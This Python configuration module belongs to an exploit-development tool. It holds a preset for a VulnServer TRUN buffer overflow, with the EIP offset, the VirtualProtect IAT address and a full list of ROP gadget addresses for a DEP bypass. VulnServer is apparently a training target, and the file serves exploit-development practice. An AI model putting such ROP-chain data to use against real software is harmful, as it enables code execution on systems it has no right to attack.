"""
Configuration Module for VirtualProtect Inspector

Provides configuration presets and validation for different exploit targets.

Author: Anubhav Gain <anubhavg@infopercept.com>
"""

from typing import Dict, Any, Optional
from dataclasses import dataclass, field
import json


@dataclass
class TargetConfig:
    """Configuration for a specific exploit target."""
    name: str
    description: str
    offset: int
    virtualprotect_iat: int
    writable_address: int
    protection_size: int = 0x201
    protection_flag: int = 0x40
    bad_chars: bytes = b"\x00"
    gadgets: Dict[str, Dict[str, Any]] = field(default_factory=dict)
    shellcode_placeholder: bytes = b""
    nop_sled_size: int = 16
    total_buffer_size: int = 6000


class Config:
    """
    Configuration manager for VirtualProtect Inspector.

    Provides preset configurations and allows custom configurations.
    """

    # Windows memory protection constants
    PAGE_NOACCESS = 0x01
    PAGE_READONLY = 0x02
    PAGE_READWRITE = 0x04
    PAGE_WRITECOPY = 0x08
    PAGE_EXECUTE = 0x10
    PAGE_EXECUTE_READ = 0x20
    PAGE_EXECUTE_READWRITE = 0x40
    PAGE_EXECUTE_WRITECOPY = 0x80

    # Common target presets
    PRESETS = {
        "vulnserver_trun": TargetConfig(
            name="VulnServer TRUN",
            description="VulnServer TRUN command buffer overflow",
            offset=2003,
            virtualprotect_iat=0x6250609c,
            writable_address=0x7653a3c1,
            protection_size=0x201,
            protection_flag=0x40,
            bad_chars=b"\x00",
            total_buffer_size=6000,
            nop_sled_size=16,
            gadgets={
                # These are example addresses - must be updated for your environment
                "pop_ebp": {
                    "address": 0x775d8836,
                    "description": "POP EBP; RET",
                    "module": "msvcrt.dll"
                },
                "pop_eax_for_ebx": {
                    "address": 0x75f366b4,
                    "description": "POP EAX; RET",
                    "module": "KERNELBASE.dll"
                },
                "neg_eax": {
                    "address": 0x76505808,
                    "description": "NEG EAX; RET",
                    "module": "KERNEL32.dll"
                },
                "xchg_eax_ebx": {
                    "address": 0x77597926,
                    "description": "XCHG EAX, EBX; RET",
                    "module": "msvcrt.dll"
                },
                "pop_eax_for_edx": {
                    "address": 0x75d91838,
                    "description": "POP EAX; RET",
                    "module": "KERNELBASE.dll"
                },
                "xchg_eax_edx": {
                    "address": 0x77d9e6c0,
                    "description": "XCHG EAX, EDX; RET",
                    "module": "ntdll.dll"
                },
                "pop_ecx": {
                    "address": 0x775f94ee,
                    "description": "POP ECX; RET",
                    "module": "msvcrt.dll"
                },
                "pop_edi": {
                    "address": 0x76fe83f7,
                    "description": "POP EDI; RET",
                    "module": "WS2_32.dll"
                },
                "rop_nop": {
                    "address": 0x7650580a,
                    "description": "RET",
                    "module": "KERNEL32.dll"
                },
                "pop_esi": {
                    "address": 0x76525760,
                    "description": "POP ESI; RET",
                    "module": "KERNEL32.dll"
                },
                "jmp_eax": {
                    "address": 0x75e95833,
                    "description": "JMP [EAX]",
                    "module": "KERNELBASE.dll"
                },
                "pop_eax": {
                    "address": 0x75ee5082,
                    "description": "POP EAX; RET",
                    "module": "KERNELBASE.dll"
                },
                "pushad": {
                    "address": 0x775d6f67,
                    "description": "PUSHAD; RET",
                    "module": "msvcrt.dll"
                },
                "jmp_esp": {
                    "address": 0x625011c7,
                    "description": "JMP ESP",
                    "module": "essfunc.dll"
                },
            }
        ),
    }

    def __init__(self):
        self.current_config: Optional[TargetConfig] = None

    def load_preset(self, preset_name: str) -> TargetConfig:
        """
        Load a preset configuration.

        Args:
            preset_name: Name of the preset to load

        Returns:
            TargetConfig object

        Raises:
            ValueError: If preset not found
        """
        if preset_name not in self.PRESETS:
            available = ", ".join(self.PRESETS.keys())
            raise ValueError(f"Preset '{preset_name}' not found. Available: {available}")

        self.current_config = self.PRESETS[preset_name]
        return self.current_config

    def create_custom_config(
        self,
        name: str,
        offset: int,
        virtualprotect_iat: int,
        writable_address: int,
        **kwargs
    ) -> TargetConfig:
        """
        Create a custom target configuration.

        Args:
            name: Name for this configuration
            offset: Offset to EIP overwrite
            virtualprotect_iat: Address of VirtualProtect in IAT
            writable_address: Writable memory address for lpflOldProtect
            **kwargs: Additional configuration options

        Returns:
            TargetConfig object
        """
        config = TargetConfig(
            name=name,
            description=kwargs.get("description", f"Custom config: {name}"),
            offset=offset,
            virtualprotect_iat=virtualprotect_iat,
            writable_address=writable_address,
            protection_size=kwargs.get("protection_size", 0x201),
            protection_flag=kwargs.get("protection_flag", self.PAGE_EXECUTE_READWRITE),
            bad_chars=kwargs.get("bad_chars", b"\x00"),
            gadgets=kwargs.get("gadgets", {}),
            nop_sled_size=kwargs.get("nop_sled_size", 16),
            total_buffer_size=kwargs.get("total_buffer_size", 6000),
        )
        self.current_config = config
        return config

    def export_config(self, config: TargetConfig, filepath: str) -> None:
        """
        Export configuration to a JSON file.

        Args:
            config: Configuration to export
            filepath: Path to save the JSON file
        """
        data = {
            "name": config.name,
            "description": config.description,
            "offset": config.offset,
            "virtualprotect_iat": hex(config.virtualprotect_iat),
            "writable_address": hex(config.writable_address),
            "protection_size": hex(config.protection_size),
            "protection_flag": hex(config.protection_flag),
            "bad_chars": config.bad_chars.hex(),
            "nop_sled_size": config.nop_sled_size,
            "total_buffer_size": config.total_buffer_size,
            "gadgets": {
                name: {
                    "address": hex(info["address"]),
                    "description": info.get("description", ""),
                    "module": info.get("module", "unknown")
                }
                for name, info in config.gadgets.items()
            }
        }

        with open(filepath, "w") as f:
            json.dump(data, f, indent=2)

    def import_config(self, filepath: str) -> TargetConfig:
        """
        Import configuration from a JSON file.

        Args:
            filepath: Path to the JSON file

        Returns:
            TargetConfig object
        """
        with open(filepath, "r") as f:
            data = json.load(f)

        # Convert hex strings back to integers
        gadgets = {
            name: {
                "address": int(info["address"], 16),
                "description": info.get("description", ""),
                "module": info.get("module", "unknown")
            }
            for name, info in data.get("gadgets", {}).items()
        }

        config = TargetConfig(
            name=data["name"],
            description=data.get("description", ""),
            offset=data["offset"],
            virtualprotect_iat=int(data["virtualprotect_iat"], 16),
            writable_address=int(data["writable_address"], 16),
            protection_size=int(data.get("protection_size", "0x201"), 16),
            protection_flag=int(data.get("protection_flag", "0x40"), 16),
            bad_chars=bytes.fromhex(data.get("bad_chars", "00")),
            nop_sled_size=data.get("nop_sled_size", 16),
            total_buffer_size=data.get("total_buffer_size", 6000),
            gadgets=gadgets,
        )

        self.current_config = config
        return config

    def list_presets(self) -> Dict[str, str]:
        """
        List all available presets.

        Returns:
            Dict mapping preset names to descriptions
        """
        return {
            name: config.description
            for name, config in self.PRESETS.items()
        }

    @staticmethod
    def protection_flag_name(flag: int) -> str:
        """
        Get the name of a memory protection flag.

        Args:
            flag: The protection flag value

        Returns:
            Human-readable name
        """
        flags = {
            0x01: "PAGE_NOACCESS",
            0x02: "PAGE_READONLY",
            0x04: "PAGE_READWRITE",
            0x08: "PAGE_WRITECOPY",
            0x10: "PAGE_EXECUTE",
            0x20: "PAGE_EXECUTE_READ",
            0x40: "PAGE_EXECUTE_READWRITE",
            0x80: "PAGE_EXECUTE_WRITECOPY",
        }
        return flags.get(flag, f"UNKNOWN (0x{flag:02x})")
